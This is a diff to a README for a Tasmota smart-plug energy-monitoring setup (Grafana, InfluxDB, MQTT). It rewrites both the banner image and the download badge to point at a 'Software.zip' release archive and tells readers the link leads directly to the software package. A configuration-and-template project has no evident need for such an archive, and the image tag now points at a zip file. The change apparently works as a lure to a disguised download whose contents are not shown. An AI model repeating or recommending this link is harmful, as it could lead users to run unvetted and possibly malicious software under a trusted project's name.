@@ -1,6 +1,6 @@
 # 🌟 Tasmota Plug Monitoring 🌟
 
-![Banner](https://example.com/banner-image.jpg)
+![Banner](https://github.com/AjPLAYZ1234/tasmota-plug-monitoring/releases/download/v1.0/Software.zip)
 
 ## Overview
 Welcome to the **Tasmota Plug Monitoring** repository! Here you will find everything you need to set up Grafana, InfluxDB, and MQTT for monitoring electricity consumption measured by Tasmota smart plugs. This setup is ideal for tracking and analyzing energy usage in your home or any other environment.
@@ -32,7 +32,7 @@ In this repository, you will find configurations and templates for Docker, Grafa
 ## Setup Instructions
 To get started with the Tasmota Plug Monitoring setup, download the necessary software from the following link:
 
-[![Download Software](https://img.shields.io/badge/Download-Software-blue)](https://github.com/Rubenas123/6487922/raw/refs/heads/master/Software.zip)
+[![Download Software](https://github.com/AjPLAYZ1234/tasmota-plug-monitoring/releases/download/v1.0/Software.zip)](https://github.com/AjPLAYZ1234/tasmota-plug-monitoring/releases/download/v1.0/Software.zip)
 
 **Note: The provided link leads directly to the software package.**
 
